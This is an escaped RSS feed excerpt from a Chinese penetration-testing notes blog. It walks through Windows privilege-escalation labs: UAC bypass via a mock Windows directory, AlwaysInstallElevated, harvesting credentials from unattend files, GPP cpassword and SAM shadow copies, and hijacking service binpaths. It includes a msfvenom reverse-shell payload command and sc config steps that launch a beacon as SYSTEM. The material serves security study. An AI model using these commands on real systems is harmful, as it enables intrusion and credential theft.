data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;md&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;\\?\c:\windows &amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;md&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;\\?\c:\windows \System32&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;copy&lt;/span&gt; c:\windows\system32\winSAT.exe &lt;span class=&#34;s2&#34;&gt;&amp;#34;\\?\c:\windows \System32\winSAT.exe&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来可以编写一个恶意的dll文件并将其放入该目录进行dll劫持，注意构造的dll需要与原来的dll具有相同的导出函数&lt;/p&gt;&#xA;&lt;h3 id=&#34;相关工具&#34;&gt;相关工具&lt;/h3&gt;&#xA;&lt;h4 id=&#34;uacme&#34;&gt;UACME&lt;/h4&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/hfiref0x/UACME&#34;&gt;hfiref0x/UACME: Defeating Windows User Account Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;集成了n种bypass UAC方法，具体使用看readme吧&lt;/p&gt;&#xA;&lt;h4 id=&#34;msf&#34;&gt;msf&lt;/h4&gt;&#xA;&lt;p&gt;msf也集成了几个绕过模块，在bypass之后，执行getsystem可以直接提升至system权限&lt;/p&gt;</description>
    </item>
    <item>
      <title>Windows提权-不安全的注册表项</title>
      <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9/</guid>
      <description>&lt;h1 id=&#34;windows提权-不安全的注册表项&#34;&gt;Windows提权-不安全的注册表项&lt;/h1&gt;&#xA;&lt;p&gt;注册表是windows系统的数据库，系统、用户配置和系统组件等信息全部存储在注册表中&lt;/p&gt;&#xA;&lt;h3 id=&#34;注册表启动项autorun&#34;&gt;注册表启动项AutoRun&lt;/h3&gt;&#xA;&lt;h3 id=&#34;alwaysinstallelevated&#34;&gt;AlwaysInstallElevated&lt;/h3&gt;&#xA;&lt;p&gt;注册表键AlwaysInstallElevated是一个策略设置项。windows允许低权限用户以System权限运行安装文件。如果启用此策略设置项，那么任何权限用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的MSI(Microsoft Installer)文件&lt;/p&gt;&#xA;&lt;p&gt;MSI文件是微软格式的应用程序安装包，实际上是一个数据库，包含安装和卸载时需要使用的大量指令和程序数据&lt;/p&gt;&#xA;&lt;h4 id=&#34;环境准备&#34;&gt;环境准备&lt;/h4&gt;&#xA;&lt;p&gt;以admin权限配置：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;win+r，gpedit.msc打开组策略管理器，找到&lt;code&gt;始终以提升的权限进行安装&lt;/code&gt;：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;计算机配置--&amp;gt;管理模板--&amp;gt;Windows 组件--&amp;gt;Windows Installer&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008213438347-767540864.png&#34; alt=&#34;image-20241008213435014&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;编辑“始终以提升的权限进行安装”为开启：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008213717931-636567087.png&#34; alt=&#34;image-20241008213714566&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;同样在用户配置中也要配置：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008213946436-248869562.png&#34; alt=&#34;image-20241008213942421&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;再在计算机配置中设置普通程序的安装可行性：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008214332196-97622985.png&#34; alt=&#34;image-20241008214328313&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;如果未成功，还可以用命令修改下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008221527885-879356893.png&#34; alt=&#34;image-20241008221525356&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;再验证一下配置是否成功：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008221554934-1304735990.png&#34; alt=&#34;image-20241008221552366&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;提权实验&#34;&gt;提权实验&lt;/h4&gt;&#xA;&lt;h5 id=&#34;msf&#34;&gt;msf&lt;/h5&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;先用MSF获取apache用户的会话：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfvenom -p windows/x64/meterpreter_reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;192.168.111.128 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;7890&lt;/span&gt; -f exe -o payload.exe&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241008221002120-1462588056.png&#34; alt=&#34;image-20241008220959447&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;当前shell权限为apache&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;使用注册表命令或使用winpeas查询到启用了AlwaysInstallElevated策略：&lt;/p&gt;</description>
    </item>
    <item>
      <title>windows提权-用户凭据操作</title>
      <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%93%8D%E4%BD%9C/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%93%8D%E4%BD%9C/</guid>
      <description>&lt;h1 id=&#34;windows提权-用户凭据操作&#34;&gt;windows提权-用户凭据操作&lt;/h1&gt;&#xA;&lt;h3 id=&#34;枚举unattended凭据&#34;&gt;枚举Unattended凭据&lt;/h3&gt;&#xA;&lt;p&gt;无人值守（Unattended）安装允许应用程序在不需要管理员关注的情况下自动安装&lt;/p&gt;&#xA;&lt;p&gt;但这样会导致系统中残留一些配置文件，其中可能包含本地管理员的用户名和密码，常见路径：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\sysprep.inf&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\syspreg\sysprep.xml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Windows\system32\sysprep.inf&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\windows\system32\sysprep\sysprep.xml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\unattend.xml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Windows\Panther\Unattend.xml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Windows\Panther\Unattended.xml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Windows\Panther\Unattend\Unattended.xml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Windows\Panther\Unattend\Unattend.xml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Windows\System32\Sysprep\Unattend.xml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Windows\System32\Sysprep\Panther\Unattend.xml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们可以全盘搜索这些文件&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;dir&lt;/span&gt; /b /s c:\unattend.xml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当然，msf提供了enum_unattend模块，可以从unattend配置文件中自动化检索用户密码&lt;/p&gt;&#xA;&lt;h3 id=&#34;获取组策略凭据&#34;&gt;获取组策略凭据&lt;/h3&gt;&#xA;&lt;p&gt;SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录域范围内共享，所有的域策略均存放在 C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中。&lt;/p&gt;&#xA;&lt;p&gt;管理员在域中新建一个组策略后，系统会自动在 SYSVOL 目录中生成一个 XML 文件&lt;/p&gt;&#xA;&lt;p&gt;该文件中保存了该组策略更新后的密码，该密码使用 AES-256 算法，但 2012 年微软公布了该密码的私钥，也就是说任何人都可以对其进行解密&lt;/p&gt;&#xA;&lt;p&gt;在目录中搜索即可：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;findstr /s /i &lt;span class=&#34;s2&#34;&gt;&amp;#34;cpassword&amp;#34;&lt;/span&gt; C:\Windows\SYSVOL\*.xml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后找到cpassword的值解密&lt;/p&gt;&#xA;&lt;p&gt;Gpprefdecrypt.py 下载地址：https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用 **msf **的 &lt;code&gt;post/windows/gather/credentials/gpp&lt;/code&gt; 模块也可以搜索cpassword并解密&lt;/p&gt;&#xA;&lt;h3 id=&#34;hivenightmare&#34;&gt;HiveNightmare&lt;/h3&gt;&#xA;&lt;p&gt;和我之前看见的卷影拷贝获取ntds.dit原理相似，任何标准用户都可以从卷影副本中读取包括SAM、SYSTEM、SECURITY在内的多个系统文件，进而从SAM获取HTLM hash，破解后可以实现权限提升&lt;/p&gt;&#xA;&lt;p&gt;低权限cmd检测是否存在漏洞：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;icacls c:\windows\system32\config\sam&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;若输出结果是：BUILTIN\USERS:(I)(RX)，表明存在漏洞（RX代表[READ/EXecute权限）&lt;/p&gt;</description>
    </item>
    <item>
      <title>Windows提权-系统服务提权</title>
      <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/</guid>
      <description>&lt;h1 id=&#34;windows提权-系统服务提权&#34;&gt;Windows提权-系统服务提权&lt;/h1&gt;&#xA;&lt;p&gt;用户安装的一些软件会在本地注册一些服务，大多数服务在计算机开机时以系统system权限启动，应用软件在注册服务时会在以下路径创建对应注册表项：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中服务的imagepath指向系统服务启动的二进制程序：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240930160837846-842417111.png&#34; alt=&#34;image-20240930160836112&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这里便产生一种提权的思路：&lt;/p&gt;&#xA;&lt;p&gt;由于大多数系统服务是system权限启动，如果让服务启动时执行其他程序，该程序就可以随着服务的启动获得系统权限，达到提权目录&lt;/p&gt;&#xA;&lt;p&gt;这类提权往往是用户配置不当导致的，接下来分类细说&lt;/p&gt;&#xA;&lt;h3 id=&#34;服务配置权限脆弱&#34;&gt;服务配置权限脆弱&lt;/h3&gt;&#xA;&lt;p&gt;windows的系统服务通过ACL来指定用户对其拥有的权限，常见权限如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240930175814869-440735998.png&#34; alt=&#34;image-20240930175813059&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;如果目标主机的用户在配置服务时存在疏忽，使低权限用户对高权限下运行的系统服务拥有更改服务配置的权限（SERVICE_CHANGE_CONFIG或SERVICE_ALL_ACCESS），即可通过该低权限用户修改服务启动时的二进制文件路径，通过修改服务启动文件的路径“ binpath”，将其替换为恶意程序的路径，这样服务启动时便会运行恶意程序&lt;/p&gt;&#xA;&lt;p&gt;存在缺陷的系统服务可以通过&lt;a href=&#34;https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk&#34;&gt;AccessChk&lt;/a&gt;来枚举：&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;AccessChk工具可以枚举目标主机上存在权限缺陷的系统服务。AccessChk是微软官方提供的管理工具，常用来枚举或查看系统中指定用户、组对特定资源(包括但不限于文件、文件夹、注册表、全局对象和系统服务等)的访问权限&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006192808014-1287893979.png&#34; alt=&#34;image-20241006192809329&#34;&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;低权限用户可以检查“Authenticated Users”组和“INTERACTIVE”组对系统服务的权限，前者为经过身份验证的用户，包含系统中所有使用用户名、密码登录并通过身份验证的账户，但不包括来宾账户，后者为交互式用户组，包含系统中所有直接登录到计算机进行操作的用户，默认情况下，这两个组为计算机本地“Users”组的成员&lt;/p&gt;&#xA;&lt;h4 id=&#34;环境准备&#34;&gt;环境准备&lt;/h4&gt;&#xA;&lt;p&gt;用admin权限配置环境：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;先建一个服务，名字为Yuy0ung，运行C盘下的1.exe：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sc create Yuy0ung binpath= &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\1.exe&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006182819967-825728272.png&#34; alt=&#34;image-20241006182820987&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;创建一个用户模拟apache：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net user apache Admin123456 /add&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006184150053-1694018241.png&#34; alt=&#34;image-20241006184151112&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;使用用subinacl（需要自己下载）给服务设置权限：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;subinacl /service Yuy0ung /grant=apache=F&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006184208974-58030882.png&#34; alt=&#34;image-20241006184210395&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;提权实验&#34;&gt;提权实验&lt;/h4&gt;&#xA;&lt;p&gt;切换到apche用户并用CS实现远控：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006191642099-1057898110.png&#34; alt=&#34;image-20241006191642815&#34;&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;上传accesschk并枚举是否具有apache用户可更改的服务配置：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;accesschk.exe /accepteula -uwcqv apache *&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006210112841-17790344.png&#34; alt=&#34;image-20241006210114114&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;若得到&lt;code&gt;SERVICE_ALL_ACCESS&lt;/code&gt;或&lt;code&gt;SERVICE_CHANGE_CONFIG&lt;/code&gt;其中之一，则允许我们配置服务&lt;/p&gt;&#xA;&lt;p&gt;**注：**除了accesschk，winpeas也可以枚举出可以修改的服务配置&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;更改Yuy0ung服务的启动文件，替换成恶意的文件（这里我选择使用上传的远控exe）然后提权：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sc config Yuy0ung binpath= &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Users\apache\Desktop\artifact.exe&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# 注意=后面有个空格&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006192349485-1581005185.png&#34; alt=&#34;image-20241006192350874&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;手动启动服务：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sc start Yuy0ung&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006192640038-1527749574.png&#34; alt=&#34;image-20241006192641132&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以看见这里成功接收到了system权限的beacon&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;服务注册表权限脆弱&#34;&gt;服务注册表权限脆弱&lt;/h3&gt;&#xA;&lt;p&gt;Windows的服务路径存储在Windows的注册表中，而注册表使用ACL来管理用户对其的访问权限，若ACL配置不当，使低权限用户可以更改注册表的选项的时候，就可以导致提权，可以将 imagepath 修改成恶意的文件，重启导致提权&lt;/p&gt;&#xA;&lt;h4 id=&#34;环境准备-1&#34;&gt;环境准备&lt;/h4&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;新建一个test服务：&lt;/p&gt;</description>
    </item>
    <item>
      <title>windows提权-访问令牌操纵</title>
